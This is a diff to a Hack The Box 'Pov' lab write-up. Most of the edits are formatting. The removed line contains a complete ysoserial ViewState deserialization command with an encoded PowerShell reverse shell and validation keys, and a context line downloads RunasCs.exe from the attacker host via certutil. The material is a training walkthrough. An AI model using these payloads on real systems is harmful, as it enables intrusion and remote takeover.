@@ -12,7 +12,7 @@ tags:
 ## Information Gathering
 ### Rustscan
 
-Rustscan finds only HTTP running on the target machine:
+Rustscan finds only **HTTP** running on the target machine:
 
 `rustscan --addresses 10.10.11.251 --range 1-65535`
 
@@ -47,7 +47,7 @@ The website is all about the Web Develop and UI/UX Designer, Stephen Fitz:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-4.png)
 
-This person must be the same person as **sfitz@pov.htb**.
+This person must be the same person as `sfitz@pov.htb`.
 
 Let's look around the website. 
 
@@ -96,14 +96,14 @@ We are able to read it with no problem:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-10.png)
 
-.NET framework seems to be version 4.5 and it also reveals decryptionKey and validationKey.
+.NET framework seems to be version 4.5 and it also reveals **decryptionKey** and **validationKey**.
 
 The next step is to generate a serialized payload using [YSoSerial.Net](https://github.com/pwntester/ysoserial.net).
 
 After downloading the file, we will run the following command:
 
 ```powershell
-./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA2ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABj<snip>==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
 ```
 
 We know, it is very long. Let's break it down. 
@@ -114,8 +114,10 @@ We know, it is very long. Let's break it down.
 
 `--validationkey` parameter includes validation key we found from **web.config**.
 
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/pov-ps.png)
 
-We will copy paste the output of the commandn to parameter **__VIEWSTATE**:
+
+We will copy paste the output of the command to parameter **__VIEWSTATE**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-13.png)
 
@@ -152,7 +154,6 @@ Now that we have the credentials for user **alaading**, we should be able to run
 Let's first upload **RunasCs.exe**:
 
 `certutil.exe -urlcache -split -f http://10.10.14.36:1234/RunasCs.exe`
-
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-18.png)
 
@@ -251,7 +252,7 @@ After we get a connection on meterpreter, let's migrate to **winlogon** and spaw
 We now have the shell as the system.
 
 ## References
-- https://jadu101.github.io/ Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Mailing#lfi-payloads
+- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Mailing#lfi-payloads
 - https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-4-.net-greater-than-4.-5-and-enableviewstatemac-true-false-and-viewstateencryptionmode-true
 - https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
 - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
